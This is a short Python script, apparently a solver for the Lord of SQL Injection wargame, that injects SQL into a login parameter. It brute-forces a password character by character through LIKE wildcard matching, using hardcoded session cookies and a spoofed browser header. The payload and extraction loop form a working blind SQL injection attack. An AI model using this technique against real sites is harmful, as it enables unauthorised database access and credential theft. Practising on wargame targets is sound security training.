import requests
from bs4 import BeautifulSoup



request_header = {
	"Accept": "*/*",
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac Os X 10_9_5) AppleWebKit 537.36 (KHMTL, like Gecko) Chrome',
	'Accept-Language': 'ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4'
}
target_url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
query = "?pw=1%27or%20length(pw)%20=%20%27{}"
s =  requests.session()
cookies = {"__cfduid":"dea80bf0edb4998f73e2bfa300ad2205c1555395056","PHPSESSID":"rovn0in7cju804dkbussm1g771"}

target_url="https://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php"

query = "?pw={}"
buf=  []
for j in range(30):

	for i in range(48,123):

		print(target_url+query.format(''.join(buf)+chr(i)+"%"))
		html = s.get(target_url+query.format(''.join(buf)+chr(i)+"%"),headers=request_header,cookies=cookies)

		bs_obj = BeautifulSoup(html.text,'html.parser')

		if 'Hello guest' in bs_obj.text:
			print('sibasbisbsi')
			print(buf)
			buf.append(chr(i))
			break
		if 'Hello admin' in bs_obj.text:
			print('sibasbisbsi')
			
			break
	else:
		break
print(buf)